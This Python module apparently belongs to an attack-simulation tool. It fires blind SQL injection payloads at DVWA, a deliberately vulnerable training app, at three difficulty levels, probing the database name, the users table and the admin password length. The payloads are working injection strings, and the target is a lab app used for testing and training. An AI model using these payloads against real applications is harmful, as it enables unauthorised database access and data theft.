"""Blind SQL Injection (boolean-based) against DVWA."""

import random
from .base import AttackModule, logger

BLIND_PAYLOADS_LOW = [
    "1' AND 1=1 #",
    "1' AND 1=2 #",
    "1' AND (SELECT LENGTH(database()))=4 #",
    "1' AND (SELECT SUBSTRING(database(),1,1))='d' #",
    "1' AND (SELECT COUNT(*) FROM users)>0 #",
    "1' AND (SELECT LENGTH(password) FROM users WHERE user='admin')>0 #",
    "1' OR SLEEP(2) #",
    "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>100 #",
]

BLIND_PAYLOADS_MEDIUM = [
    "1 AND 1=1",
    "1 AND 1=2",
    "1 AND (SELECT LENGTH(database()))=4",
    "1 AND (SELECT COUNT(*) FROM users)>0",
]


class SqlInjectionBlind(AttackModule):
    NAME = "sqli_blind"

    def run_low(self, session):
        for payload in random.sample(BLIND_PAYLOADS_LOW, min(5, len(BLIND_PAYLOADS_LOW))):
            token = session.get_csrf_token("/vulnerabilities/sqli_blind/")
            session.get(
                "/vulnerabilities/sqli_blind/",
                params={"id": payload, "Submit": "Submit", "user_token": token},
            )
            logger.debug("[sqli_blind] Payload: %s", payload)

    def run_medium(self, session):
        for payload in BLIND_PAYLOADS_MEDIUM:
            token = session.get_csrf_token("/vulnerabilities/sqli_blind/")
            session.post(
                "/vulnerabilities/sqli_blind/",
                data={"id": payload, "Submit": "Submit", "user_token": token},
            )

    def run_high(self, session):
        for payload in ["1' AND 1=1 #", "1' AND 1=2 #", "1' OR SLEEP(1) #"]:
            session.post(
                "/vulnerabilities/sqli_blind/",
                data={"id": payload, "Submit": "Submit"},
                cookies={"id": payload},
            )
            session.get("/vulnerabilities/sqli_blind/")
